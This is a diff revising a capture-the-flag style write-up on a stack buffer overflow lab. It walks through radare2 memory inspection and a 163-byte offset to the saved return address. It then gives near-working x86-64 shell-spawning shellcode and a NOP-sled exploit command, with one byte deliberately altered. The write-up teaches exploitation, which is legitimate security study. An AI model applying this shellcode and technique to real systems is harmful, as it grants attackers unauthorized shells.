@@ -6,7 +6,7 @@ You should be able to...
 1. distinguish concepts such as a stack, a frame and a heap; 
 2. understand C programs and in particular, what are pointer objects. 
 3. have a decent understanding of the Assembly language. 
-4. understand the basic commands of a decompiler (`r2` or `gdb`, on Kali): set breaking points (`db`), read registers (`dr`) and a particuler adress in memory (`px @`). 
+4. understand the basic commands of a decompiler (`r2` or `gdb`, on Kali): set breaking points (`db`), read registers (`dr`) and a particuler address in memory (`px @`). 
 4. understand what Assembly instructions like `call` and `ret` perform in the backend. 
 
 ### Great readings/challenges to help you achieve that:
@@ -76,40 +76,39 @@ ds
 dr                      <----- mention #2 below
 dc
 ```
-The commands `aa` and `afl` are prerequistes for the debugged to find the important entry/exit points within the program. The commands `pdf @ [function name]` simply display the assembly code of the given function. In particular, each instruction is prepended by its adress in memory. The command `db [memory adress]` sets a _breaking point_ to stop the program flow. The command `dc` starts or continues the execution of the program until either a braking point or the end of the program is reached. The command `dr` shows the memory register and the command `ds` executes only one instruction of the program (that is the one following whare the program is currently at). Finally, the command `px @ [memory adress]` shows the content of the memory starting at the given adress and in the next 256 bytes. 
+The commands `aa` and `afl` are prerequistes for the debugger to find the important entry/exit points within the binary. The commands `pdf @ [function name]` simply display the assembly code of the given function. In such display, each instruction is preceded by a the columns showing its address in memory. The command `db [memory address]` sets a _breaking point_ to stop the program flow. The command `dc` starts or continues the execution of the program until either a breaking point or the end of the program is reached. The command `dr` shows the memory register and the command `ds` executes only one instruction of the program (that is the one following whare the program is currently at). Finally, the command `px @ [memory address]` shows the content of the memory starting at the given address and in the next 256 bytes. 
 
-We explain the highlights of these instructions in the following paragraph. 
+We explain the highlights of these instructions in the following paragraphs. 
 
-The assembly code of the `main` function is shown below. One should notice that the memory adress of the instruction right after the `call sys.concat_arg` is `0x004005ce`. Given our simple explanation of how a the memory of a function works, this is the adresse that should be in the instruction pointer's value once the function `concat_arg` is called. 
+The assembly code of the `main` function is shown below. One should notice that the memory address of the instruction right after the `call sys.concat_arg` is `0x004005ce`. Given how the memory related to a function call is managed, this is the address that will be in the instruction pointer's value once the function `concat_arg` is called. 
 
 ![figure-1.png](figure-1.png)
 
-The assembly code of the `concat_arg` function is shown below. Notice that we have introduced a breaking point at the instruction `NOP` (adress `0x004005a9`). This instruction is particularly interesting, as it will allow us to see the content of the memory just before the `ret` instruction is performed. 
+The assembly code of the `concat_arg` function is shown below. Notice that we have introduced a breaking point at the instruction `NOP` (address `0x004005a9`). This instruction is interesting because it allows us to see the content of the memory just before the `ret` instruction is performed. 
 
 ![figure-2.png](figure-2.png)
 
-The memory at this point is illustrated in the picture below. Although this is a "rectangular" shaped representation of the memory, it can be reorganised to fit the model we have presented above. 
+The memory at this breaking point is illustrated in the picture below. Although the picture shows a squared representation of the memory, it can be reorganised to fit the model we have presented above by putting one line after the other. 
 
 ![figure-3.png](figure-3.png)
 
-Notice that the partition containing the function's arguments is almost empty. It begins with "doggoBBBB" and is then filled with a bunch of zeros. This is because the function's argument ("BBBB") is well within the buffer size of the function. The word "doggo" is present in memory
-because the chosen breaking point is at the end of the function's instructions. As such, it is after the string concatenation of the function's arguments and the string "doggo". The "boring stuff" in memory is nothing but the register base pointer (rbp in the registery), which has the value `90e3 ffff ff7f 0000`. Since the notation is in little indian, it means that the saved registery is `0x00007fffffffe309`. Finally, the saved instruction pointer has the value `ce05 4000 0000 0000`, or `0x00000000004005ce`, which is nothing but the adress of the instruction following the `call sym.concat_arg` instruction.
+Notice that the partition containing the function's arguments is almost empty. It begins with "doggoBBBB" (hex 646f 6767 6f41 4141 41) and is then filled with a bunch of zeros. This is because the function's argument ("BBBB") is well within the buffer size of the function. The word "doggo" is present in memory
+because the chosen breaking point is at the end of the function's instructions. As such, it is after the string concatenation of the function's arguments and the string "doggo". The "boring stuff" in memory is nothing but the registery base pointer (rbp in the registery), which has the value `90e3 ffff ff7f 0000`. Since the notation is in little indian, it means that the saved registery is `0x00007fffffffe309`. Finally, the saved instruction pointer has the value `ce05 4000 0000 0000`, or `0x00000000004005ce`, which is nothing but the address of the instruction following the `call sym.concat_arg` instruction.
 
 To sum up, our examination of the function's memory shows the following content: 
 
 ```
-[doggoBBB        (...bunch of zeros...)           ][90e3 ffff ff7f 0000][ce05 4000 0000 0000].
+[646f 6767 6f41 4141   (...bunch of zeros...)      ][90e3 ffff ff7f 0000][ce05 4000 0000 0000].
 ```
 
-If we keep going through the motions of the code presented above, an examination of the instruction pointer at the "mention #1" will reveal that it equalts `0x004005aa`, which is a memory adress that is still within the execution flow of the function. Two instructions later, its value is however equal to `0x004005ce` that is the value that was contained in the function's memory and regurgitated to the main program by the `ret` instruction. All of this happens in the background. Since the memory adress is the one intented by the original programmers, the program flow resumes normally and the binary does what it is supposed to do (display "doggoBBB"). 
+If we keep going through the code flow, an examination of the instruction pointer at the "mention #1" will reveal that it equals `0x004005aa`, which is a memory address designating an instruction within the function. Two instructions later (mention #2), the value of the register is however equal to `0x004005ce` that is the value that was contained in the function's memory. It has been regurgitated to the main program by the `ret` instruction, so as to continue the normal flow of the program after the function ended. All of this happens in the background. Since the memory address is the one intented by the original program, the flow resumes normally and the binary does what it is supposed to do (display "doggoBBBB"). 
 
-# Going through the motions of an overflowed `ret` call
 ## The overflowed case
 Consider the following code: 
 ```
 r2 -d ./buffer-overflow-2 $(python -c "print 'A'*163 + 'B'*6")
 ```
-and then in the debugger command line: 
+and then, in the debugger command line: 
 ```
 aa
 afl
@@ -124,16 +123,19 @@ ds
 dr                      <------ mention #4
 dc
 ```
-This code goes through the same motions as in the previous section, but this time with a program input that has 155 consecutive A's followed by six B's (BBBBBB). This input overflows the intended buffer of function `concat_arg`. A quick examination of the memory right before the `ret` instruction is called shows the following content: 
+This code goes through the same motions as in the previous section, but this time with a program input that has 163 consecutive A's followed by six B's (BBBBBB). This input overflows the intended buffer of function `concat_arg`: the memory allocated for the function's arguments is insufficient. A quick examination of the memory right before the `ret` instruction is called shows the following content: 
 
 ![figure-4.png](figure-4.png)
 
 This content means, in turn, the following memory model: 
 ```
-[doggoAAAA         (...bunch of As...)           ][AAAA AAAA AAAA AAAA][BBBB BBBB BBBB 0000].
+[646f 6767 6f41 4141 (...bunch of 41s...)        ][4141 4141 4141 4141][4242 4242 4242 0000].
 ```
-
-This goes to show that by overflowing the function's inputs, we have been able to overwrite the instruction pointer to the value `0x0000BBBBBBBBBBBB`. (It also reveals an offset of 163 bytes). Of course, there is nothing that the program can comprehend at the adress `0x0000BBBBBBBBBBBB`, and so it will crash. If we however refine the idea and present an adress that points to malicious code, we will be well on our way. 
+or in plain ASCII:
+```
+[doggoAAAA         (...bunch of As...)           ][AA AA AA AA][BB BB BB 0000].
+```
+This goes to show that by overflowing the function's inputs with 163 consecutive A's, we have been able to overwrite the instruction pointer to the value `0x0000424242424242`, that is six consecutive B's. (It thus reveals an offset of 163 bytes). Of course, there is no instruction that the program can comprehend at the address `0x0000424242424242`, and so it attempting to execute it will lead to a crash. If we however refine the idea and replace the B's by an address that points to some malicious code, we will be well on our way. 
 
 Before we move on to the rest of the write-up, it is worth nothing that before the `ret` instruction is called (mention #3) the instruction pointer in the registery is equal to `0x004005aa` while two steps later (mention #4), it equals `0x424242424242` (which is BBBBBB in hexadecimal). This is so because the `ret` instruction unpacked the value "BBBBBB" from memory and assigned it to the instruction pointer in the registery. We thus have hacked the flow of the program.  
 
@@ -155,7 +157,7 @@ The general strategy is very well explained in [L1ges write-up](https://l1ge.git
    ```
   \x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
     ```
-    (Again, with ***one** hexadecimal incorrectly specified)
+    (With **one** hexadecimal incorrectly specified that will be accurate if the proper number is changed in the previous command.)
     
     For our purpose, this is our malicious code. It is 54 bytes long, which is smaller than the offset that we have identified. 
     
@@ -164,21 +166,21 @@ There are three important ideas here. First, the total length of the offset must
 ```
 NL + 54 + NR = O
 ```
-Second, the left padding must be filled with `NOPS` instructions (hex code `\x90`). The "no operation' instruction instructs the processor to skip the hex code and move on the next one. Providing the left padding with `NOPS` gives us some manoeuver, so that the instruction pointer in memory lands in a region that will push the program towards the execution of the malicous code. If it lands on any `NOPS` instruction, it will be automatically forwarded towards the starting point of the malicious code. 
+Second, the left padding must be filled with `NOPS` instructions (hex code `\x90`). The "no operation' code instructs the processor to skip to the next hex code. Thus, the left padding with `NOPS` gives us some manoeuver: if the instruction pointer lands on any `NOPS` instruction, it will be automatically forwarded towards the starting point of the malicious code. 
 
-Third, the bytes in the right padding part should by any bite that is not corrupted (see [Tib3rius' room](https://tryhackme.com/room/bufferoverflowprep) for a walkthrough). For our practical purpose, the byte `\x41` (the letter A) works fine, but this may not be the case in all situations.
+Third, the bytes in the right padding part should by any byte that is not seen as corrupted by the binary (see [Tib3rius' room](https://tryhackme.com/room/bufferoverflowprep) for a practical overview). For our purpose, the byte `\x41` (the letter A) works fine, but this may not be the case in all situations.
 
 Fourth, there should be padding on both the right and left side, although it is better to put more padding on the left than on the right. There is no exact amount, saved for the cardinal rule that the total length must equal the offset (with the malicous code). 
 
-## 4- Choose a memory adress within the left padding
-This adress will be used to point the instruction pointer towards the malicious code. In practical situations, this could be done by trial and errors (or programmed within the malicious code). Here, we know from the previous sections where the function's memory starts. Consistent with the number of bytes for the left and right padding (numbers not shown), the example below uses "0x7fffffffe272". Then, the following command can be used to perform the exploit: 
+## 4- Choose a memory address within the left padding
+This address will be used to point the instruction pointer towards the malicious code. In practical situations, this could be done by trial and errors (or programmed within the malicious code). Here, we know from the previous sections where the function's memory starts. Consistent with the number of bytes for the left and right padding (numbers not shown), the example below uses "0x7fffffffe272" as the pointer redirection. Summing up, the following command can be used to perform the exploit: 
 ```
 ./buffer-overflow-2 $(python -c "print '\x90'*NL+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'  +'A'*NR+ '\x72\xe2\xff\xff\xff\x7f'")
 ```
 For this command to function:
 - `NL` and `NR` must be replaced by the proper numerical values; 
 - One hexadecimal point must be changed to fit the needs of task 9 (see the comments related to Lige's write-up in section 2). 
-- The hexadecimal adress of the instruction pointer must be coherent with the values of `NL` and `NR`. 
+- The hexadecimal address of the instruction pointer must be coherent with the values of `NL` and `NR`. 
 
 With the proper modifications, one can get a sweet, sweet shell: 
 
